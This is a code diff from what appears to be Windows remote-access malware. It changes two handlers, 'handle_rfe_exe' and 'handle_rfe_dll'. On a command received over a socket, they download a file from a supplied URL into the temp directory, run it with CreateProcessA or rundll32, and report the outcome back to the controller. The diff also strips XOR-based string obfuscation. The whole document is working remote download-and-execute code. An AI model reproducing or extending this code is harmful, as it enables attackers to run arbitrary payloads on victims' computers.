@@ -6,7 +6,7 @@
 
 static void rfe_send(SOCKET sock, HANDLE mutex, const char* msg) {
     char* buf = malloc(strlen(msg) + 32);
-    sprintf(buf, xor_str(_S("[rfe_result]%s")), msg);
+    sprintf(buf, "[rfe_result]%s", msg);
     sock_send(sock, mutex, buf);
     free(buf);
 }
@@ -74,10 +74,10 @@ void handle_rfe_exe(SOCKET sock, HANDLE mutex, const char* payload) {
 
     char tmp[MAX_PATH];
     GetTempPathA(MAX_PATH, tmp);
-    strcat(tmp, xor_str(_S("tmp_exe.exe")));
+    strcat(tmp, "tmp_exe.exe");
 
     if (!winhttp_download(url, tmp)) {
-        rfe_send(sock, mutex, xor_str(_S("error:Download failed")));
+        rfe_send(sock, mutex, "error:Download failed");
         return;
     }
 
@@ -87,11 +87,11 @@ void handle_rfe_exe(SOCKET sock, HANDLE mutex, const char* payload) {
     sprintf(cmd, "\"%s\" %s", tmp, args);
     if (CreateProcessA(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
         WaitForSingleObject(pi.hProcess, INFINITE);
-        rfe_send(sock, mutex, xor_str(_S("ok:Execution finished")));
+        rfe_send(sock, mutex, "ok:Execution finished");
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
     } else {
-        rfe_send(sock, mutex, xor_str(_S("error:CreateProcess failed")));
+        rfe_send(sock, mutex, "error:CreateProcess failed");
     }
     DeleteFileA(tmp);
 }
@@ -99,22 +99,22 @@ void handle_rfe_exe(SOCKET sock, HANDLE mutex, const char* payload) {
 void handle_rfe_dll(SOCKET sock, HANDLE mutex, const char* url) {
     char tmp[MAX_PATH];
     GetTempPathA(MAX_PATH, tmp);
-    strcat(tmp, xor_str(_S("tmp_dll.dll")));
+    strcat(tmp, "tmp_dll.dll");
 
     if (!winhttp_download(url, tmp)) {
-        rfe_send(sock, mutex, xor_str(_S("error:Download failed")));
+        rfe_send(sock, mutex, "error:Download failed");
         return;
     }
 
     STARTUPINFOA si = { sizeof(si) };
     PROCESS_INFORMATION pi = { 0 };
     char cmd[1024];
-    sprintf(cmd, xor_str(_S("rundll32.exe \"%s\"")), tmp);
+    sprintf(cmd, "rundll32.exe \"%s\"", tmp);
     if (CreateProcessA(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
-        rfe_send(sock, mutex, xor_str(_S("ok:rundll32 started")));
+        rfe_send(sock, mutex, "ok:rundll32 started");
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
     } else {
-        rfe_send(sock, mutex, xor_str(_S("error:rundll32 failed")));
+        rfe_send(sock, mutex, "error:rundll32 failed");
     }
 }
